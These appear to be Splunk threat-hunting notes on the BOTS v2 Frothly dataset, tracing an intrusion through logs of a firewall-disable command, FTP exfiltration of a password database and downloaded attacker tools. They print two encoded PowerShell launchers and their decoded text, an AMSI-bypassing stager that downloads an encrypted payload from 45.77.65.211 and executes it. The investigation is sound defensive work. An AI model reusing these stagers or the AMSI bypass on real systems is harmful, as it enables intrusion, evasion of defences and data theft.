## index="botsv*" "frothly\\\billy.tun"
### index="botsv*" user="frothly\\billy.tun" 45.77.65.211 | stats count by src_ip,dest_ip
| src_ip     | dest_ip     | count |
|------------|-------------|-------|
| 10.0.2.107 | 45.77.65.211 | 12487 |

### index="botsv*" "frothly\\\billy.tun" process_name="netsh.exe"
```sh
08/23/2017 08:33:29 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=wrk-btun.frothly.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=57321
Keywords=Audit Success
Message=A new process has been created.

Subject:
	Security ID:		FROTHLY\billy.tun
	Account Name:		billy.tun
	Account Domain:		FROTHLY
	Logon ID:		0x25276

Process Information:
	New Process ID:		0x1168
	New Process Name:	C:\Windows\System32\netsh.exe
	Token Elevation Type:	TokenElevationTypeFull (2)
	Creator Process ID:	0xe80
	Process Command Line:	"C:\Windows\system32\netsh.exe"  advfirewall set allprofiles state off

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
```



## index="botsv*" "10.0.2.107"
### index="botsv*" "10.0.2.107" | stats count by src_ip,dest_ip

### index="botsv*" 10.0.2.107 EventCode=4624 | stats count by Workstation_Name
| Workstation_Name | count |
|------------------|-------|
| WRK-BTUN         | 515   |

### index="botsv*" WRK-BTUN AND EventCode IN (4648,4688) AND powershell AND -enc | stats count by Creator_Process_ID
| Creator_Process_ID | count |
|--------------------|-------|
| 0x1174             | 1     |
| 0x8c0              | 1     |
| 0xed8              | 1     |

### index="botsv*" WRK-BTUN AND EventCode IN (4648,4688) AND parent_process_id IN (0xed8, 0x8c0, 0x1174) | stats count by process_command_line_process,process_command_line_arguments
| process_command_line_process                                 | process_command_line_arguments                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | count |
|--------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------|
| C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe    | -NoP -NonI -W Hidden -enc WwBSAGUAZgBdAC4AQQBzAFMARQBtAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBMAFUARQAoACQAbgBVAEwAbAAsACQAVABSAHUARQApAH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAHQALgBTAEUAUgB2AEkAQwBFAFAATwBJAG4AVABNAEEAbgBhAGcARQBSAF0AOgA6AEUAWABQAEUAYwB0ADEAMAAwAEMAbwBuAHQAaQBOAHUAZQA9ADAAOwAkAHcAQwA9AE4ARQBXAC0ATwBiAGoARQBDAHQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBFAGIAQwBsAGkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAdwBjAC4ASABlAEEAZABlAFIAUwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBDAC4AUAByAG8AeAB5AD0AWwBTAHkAUwBUAEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBFAFEAVQBlAFMAdABdADoAOgBEAEUAZgBBAHUAbABUAFcAZQBCAFAAcgBvAHgAWQA7ACQAVwBjAC4AUABSAE8AeAB5AC4AQwBSAGUARABlAE4AdABJAGEAbABTACAAPQAgAFsAUwB5AHMAdABlAE0ALgBOAEUAdAAuAEMAcgBFAGQARQBuAHQAaQBhAEwAQwBhAGCASABlAF0AOgA6AEQAZQBGAEEAdQBMAHQATgBlAHQAVwBPAFIAawBDAFIARQBEAGUATgB0AEkAQQBsAHMAOwAkAEsAPQBbAFMAeQBzAHQARQBtAC4AVABlAHgAdAAuAEUAbgBjAE8ARABJAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAHkAVABlAFMAKAAnADMAOAA5ADIAOAA4AGUAZABkADcAOABlADgAZQBhADIAZgA1ADQAOQA0ADYAZAAzADIAMAA5AGIAMQA2AGIAOAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAHgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQARQBSAHMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AGwAcgB0AFIASABLAGsAQQA2AEkATAA1AGgALwBkADgARQBrAGsANgBRAHMAeAB5AFAAdgBrAD0AIgApADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACcALwBhAGQAbQBpAG4ALwBnAGUAdAAuAHAAaABwACcAOwAkAEQAQQBUAEEAPQAkAFcAQwAuAEQAbwBXAE4ATABvAGEARABEAEEAVABBACgAJABTAEUAUgArACQAVAApADsAJABpAFYAPQAkAEQAQQB0AGEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAEQAYQBUAGEALgBsAEUATgBHAFQAaABdADsALQBKAG8ASQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA== | 1     |
| C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe    | -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | 1     |
| powershell                                                   | -noP -sta -w 1 -enc  WwBSAEUARgBdAC4AQQBTAFMARQBtAGIAbABZAC4ARwBlAFQAVABZAFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAdABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBMAHUAZQAoACQAbgB1AEwAbAAsACQAVAByAHUARQApAH0AOwBbAFMAWQBzAFQARQBNAC4ATgBlAHQALgBTAGUAcgBWAEkAYwBFAFAATwBpAG4AVABNAEEAbgBBAEcARQByAF0AOgA6AEUAWABQAEUAYwBUADEAMAAwAEMATwBOAHQAaQBuAHUAZQA9ADAAOwAkAHcAQwA9AE4ARQB3AC0ATwBCAGoARQBDAFQAIABTAHkAcwBUAGUAbQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAVwBjAC4ASABlAEEARABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUABSAE8AWAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4ARQB0AC4AVwBFAEIAUgBlAHEAdQBlAFMAVABdADoAOgBEAGUAZgBBAFUAbAB0AFcAZQBiAFAAcgBPAHgAeQA7ACQAVwBDAC4AUABSAG8AeAB5AC4AQwBSAEUARABlAE4AdABJAEEAbABzACAAPQAgAFsAUwB5AFMAdABlAE0ALgBOAEUAVAAuAEMAUgBlAGQARQBOAHQAaQBBAGwAQwBBAEMAaABFAF0AOgA6AEQAZQBGAEEAdQBsAFQATgBFAFQAVwBvAFIAawBDAHIAZQBEAEUATgBUAEkAYQBsAFMAOwAkAEsAPQBbAFMAeQBzAFQAZQBtAC4AVABFAHgAdAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAVABlAHMAKAAnADMAOAA5ADIAOAA4AGUAZABkADcAOABlADgAZQBhADIAZgA1ADQAOQA0ADYAZAAzADIAMAA5AGIAMQA2AGIAOAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAFcAQwAuAEgAZQBhAEQAZQBSAFMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AGoAawBuAFgAcABvAGEANwBwAFUAQQAwAGwARABCACsAbgBZAGkAUQB2AFUAOQB1AG4ASABnAD0AIgApADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQARABBAFQAQQA9ACQAVwBDAC4ARABvAFcAbgBMAG8AQQBkAEQAYQBUAGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAVgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAYQA9ACQARABhAFQAQQBbADQALgAuACQAZABhAFQAYQAuAEwAZQBOAEcAdABIAF0AOwAtAGoAbwBpAE4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
```powerhshell
[Ref].AsSEmbLY.GetTYPE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeLd('amsiInitFailed','NonPublic,Static').SEtVaLUE($nULl,$TRuE)};[SYstem.NEt.SERvICEPOInTMAnagER]::EXPEct100ContiNue=0;$wC=NEW-ObjECt SYsTeM.NeT.WEbCliEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HeAdeRS.AdD('User-Agent',$u);$WC.Proxy=[SySTEm.Net.WeBREQUeSt]::DEfAulTWeBProxY;$Wc.PROxy.CReDeNtIalS = [SysteM.NEt.CrEdEntiaLCa`He]::DeFAuLtNetWORkCREDeNtIAls;$K=[SystEm.Text.EncODIng]::ASCII.GeTByTeS('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ARgs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CouNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BxOR$S[($S[$I]+$S[$H])%256]}};$wc.HeadERs.ADd("Cookie","session=lrtRHKkA6IL5h/d8Ekk6QsxyPvk=");$ser='https://45.77.65.211:443';$t='/admin/get.php';$DATA=$WC.DoWNLoaDDATA($SER+$T);$iV=$DAta[0..3];$DatA=$dATa[4..$DaTa.lENGTh];-JoIN[CHar[]](& $R $daTa ($IV+$K))|IEX
```
```powershell
[REF].ASSEmblY.GeTTYPe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GetFIELd('amsiInitFailed','NonPublic,Static').SetVaLue($nuLl,$TruE)};[SYsTEM.Net.SerVIcEPOinTMAnAGEr]::EXPEcT100CONtinue=0;$wC=NEw-OBjECT SysTem.NEt.WeBCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeADers.Add('User-Agent',$u);$Wc.PROXy=[System.NEt.WEBRequeST]::DefAUltWebPrOxy;$WC.PRoxy.CREDeNtIAls = [SySteM.NET.CRedENtiAlCAChE]::DeFAulTNETWoRkCreDENTIalS;$K=[SysTem.TExt.ENcOdiNG]::ASCII.GetBYTes('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXoR$S[($S[$I]+$S[$H])%256]}};$WC.HeaDeRS.Add("Cookie","session=jknXpoa7pUA0lDB+nYiQvU9unHg=");$ser='https://45.77.65.211:443';$t='/login/process.php';$DATA=$WC.DoWnLoAdDaTa($SEr+$t);$IV=$DATa[0..3];$dATa=$DaTA[4..$daTa.LeNGtH];-joiN[CHar[]](& $R $data ($IV+$K))|IEX
```




##  index="botsv*" sourcetype="stream:ftp"
### index="botsv*" sourcetype="stream:ftp" loadway=Upload "*.pdf" | stats count by src_ip,dest_ip
| src_ip | dest_ip | count |
| -      | -       | -     |
| 10.0.2.107 | 160.153.91.7 | 710 |

### index="botsv*" sourcetype="stream:ftp" loadway=Upload NOT "*.pdf" | stats count by src_ip,dest_ip,filename
| src_ip | dest_ip | filename | count |
| -      |    -    |    -     |   -   |
| 10.0.2.109 | 160.153.91.7 | frothly_passwords.kdbx | 1 |

### index="botsv*" sourcetype="stream:ftp" loadway=Download | stats count by src_ip,dest_ip,filename
| src_ip     | dest_ip      | filename                                   | count |
|------------|--------------|--------------------------------------------|--------|
| 10.0.2.107 | 160.153.91.7 | dns.py                                     | 1      |
| 10.0.2.107 | 160.153.91.7 | nc.exe                                     | 1      |
| 10.0.2.107 | 160.153.91.7 | psexec.exe                                 | 1      |
| 10.0.2.107 | 160.153.91.7 | python-2.7.6.amd64.msi                      | 1      |
| 10.0.2.107 | 160.153.91.7 | wget64.exe                                 | 1      |
| 10.0.2.107 | 160.153.91.7 | winsys64.dll                               | 1      |
| 10.0.2.107 | 160.153.91.7 | 나는_데이비드를_사랑한다.hwp                | 1      |
| 10.0.2.109 | 160.153.91.7 | dns.py                                     | 1      |
| 10.0.2.109 | 160.153.91.7 | nc.exe                                     | 1      |
| 10.0.2.109 | 160.153.91.7 | psexec.exe                                 | 1      |
| 10.0.2.109 | 160.153.91.7 | python-2.7.6.amd64.msi                      | 1      |
| 10.0.2.109 | 160.153.91.7 | wget64.exe                                 | 1      |
| 10.0.2.109 | 160.153.91.7 | winsys64.dll                               | 1      |
| 10.0.2.109 | 160.153.91.7 | 나는_데이비드를_사랑한다.hwp                | 1      |



## index="botsv*" "160.153.91.7"
### index="botsv*" "160.153.91.7" | stats count by src_ip,dest_ip
| src_ip       | dest_ip      | count |
|--------------|--------------|-------|
| 10.0.1.100   | 160.153.91.7 | 3     |
| 10.0.1.100   | 8.8.8.8      | 9     |
| 10.0.1.101   | 160.153.91.7 | 3     |
| 10.0.1.101   | 4.4.4.4      | 1     |
| 10.0.2.107   | 10.0.1.100   | 8     |
| 10.0.2.107   | 160.153.91.7 | 1479  |
| 10.0.2.109   | 10.0.1.100   | 4     |
| 10.0.2.109   | 160.153.91.7 | 41    |
| 71.39.18.125 | 160.153.91.7 | 2     |
| 160.153.91.7 | 10.0.2.107   | 2144  |
| 160.153.91.7 | 10.0.2.109   | 27    |
| 160.153.91.7 | 71.39.18.125 | 1450  |
